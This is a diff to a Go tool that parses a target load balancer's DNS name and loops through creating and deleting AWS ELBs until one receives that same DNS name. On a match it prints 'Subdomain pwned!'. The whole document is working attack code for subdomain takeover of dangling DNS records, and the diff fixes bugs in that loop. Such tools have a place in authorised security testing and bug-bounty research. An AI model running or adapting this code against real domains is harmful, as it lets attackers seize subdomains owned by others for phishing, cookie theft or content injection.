@@ -26,7 +26,7 @@ func main() {
 	*/
 	reNum := regexp.MustCompile(`-(\d{6,10})\.`)
 	// Get the "random" number from the elb
-	NumToFind := string(reNum.FindStringSubmatch(*elbPtr)[0])
+	NumToFind := string(reNum.FindStringSubmatch(*elbPtr)[1])
 
 	fmt.Println(NumToFind)
 
@@ -55,13 +55,17 @@ func main() {
 	// Define the regex to match the region
 	reRegion := regexp.MustCompile(`(us(-gov)?|ap|ca|cn|eu|sa)-(central|(north|south)?(east|west)?)-\d`)
 	// Get the region of the ELB
-	elbRegion := string(reRegion.FindString(*elbPtr)[0])
+	elbRegion := string(reRegion.FindStringSubmatch(*elbPtr)[0])
+
+	fmt.Println(elbRegion)
 
 	// Get the "name" of the ELB that we'll be using to create new ELBs
 	// Define the regex
 	reName := regexp.MustCompile(`^(.*)-\d{6,10}\.`)
 	// Get the name
-	elbName := string(reName.FindStringSubmatch(*elbPtr)[0])
+	elbName := string(reName.FindStringSubmatch(*elbPtr)[1])
+
+	fmt.Println(elbName)
 
 	// Now that we have what we're looking for, let's start to create ELBs
 
@@ -76,39 +80,16 @@ func main() {
 	// Create ELB service client
 	svc := elb.New(sess)
 
-	// initialise empty var so we can loop
-	result := ""
 	// Loop through creation until we found it
-	for result != *elbPtr {
-		// if we have an ELB at this point, we need to delete it to not pile them up
-		if result != "" {
-			input := &elb.DeleteLoadBalancerInput{
-				LoadBalancerName: aws.String(result),
-			}
-
-			_, err := svc.DeleteLoadBalancer(input)
-			if err != nil {
-				if aerr, ok := err.(awserr.Error); ok {
-					switch aerr.Code() {
-					default:
-						fmt.Println(aerr.Error())
-					}
-				} else {
-					// Print the error, cast err to awserr.Error to get the Code and
-					// Message from an error.
-					fmt.Println(err.Error())
-				}
-				return
-			}
-		}
-		fmt.Println(result)
-
+	for {
+		// initialise empty var so we can loop
+		result := &elb.CreateLoadBalancerOutput{}
 		// Now start to create a new ELB
 		// reference: https://docs.aws.amazon.com/sdk-for-go/api/service/elb/#ELB.CreateLoadBalancer
 		fmt.Println("Creating ELB")
 		input := &elb.CreateLoadBalancerInput{
 			AvailabilityZones: []*string{
-				aws.String(elbRegion),
+				aws.String(elbRegion + "a"),
 			},
 			Listeners: []*elb.Listener{
 				{
@@ -159,8 +140,37 @@ func main() {
 			}
 			return
 		}
-
 		fmt.Println(result)
+		if *result.DNSName == *elbPtr {
+			fmt.Println("Found match!")
+			fmt.Println("ELB created!")
+			fmt.Println("Subdomain pwned!")
+			break
+		}
+		// if we have an ELB at this point, we need to delete it to not pile them up
+		if *result.DNSName != "" {
+			fmt.Println("Deleting current ELB:" + *result.DNSName)
+			input := &elb.DeleteLoadBalancerInput{
+				LoadBalancerName: aws.String(elbName),
+			}
+
+			_, err := svc.DeleteLoadBalancer(input)
+			if err != nil {
+				if aerr, ok := err.(awserr.Error); ok {
+					switch aerr.Code() {
+					default:
+						fmt.Println(aerr.Error())
+					}
+				} else {
+					// Print the error, cast err to awserr.Error to get the Code and
+					// Message from an error.
+					fmt.Println(err.Error())
+				}
+				return
+			}
+			fmt.Println("Deleted existing ELB successfully")
+		}
+		fmt.Println("Next try")
 	}
 	fmt.Println("Found match!")
 	fmt.Println("ELB created!")
